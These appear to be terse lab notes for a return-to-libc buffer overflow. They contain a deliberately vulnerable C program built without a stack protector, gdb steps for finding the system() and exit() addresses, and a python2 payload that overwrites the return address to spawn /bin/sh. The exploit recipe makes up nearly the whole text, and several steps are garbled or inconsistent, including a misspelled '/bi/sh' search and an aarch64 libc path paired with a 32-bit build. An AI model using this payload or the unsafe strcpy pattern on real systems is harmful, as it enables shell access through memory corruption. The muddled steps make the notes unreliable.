#########################ReturnToLibc##################
#include <stdio.h>   
#include <string.h>   
 
void vulnerable(char *tmp) {   
    char input[400];   
    strcpy(input,tmp); //copies a malicious string into the character buffer   
}   
 
int main(int argc, char* argv[]) {   
    if (argc != 2) { //error message if run improperly   
        printf("Usage: ./prog argn"); 
        return 1;   
    }   
    vulnerable(argv[1]); //passes our input to the vulnerable function   
    return 0;   
}
gcc vul.c -o vul -m32 -fno-stack-protector
gdb ./vul
b main====run===p system===p exit===info proc map==exit
strings -a -t x /usr/lib/aarch64-linux-gnu/libc.so.6 | grep "/bi/sh"
hex cal===string+info proc map
gdb ./vul
run `python2 -c 'print("A"*412 + "syst add" + "exit addr" + "/bin/sh")'`
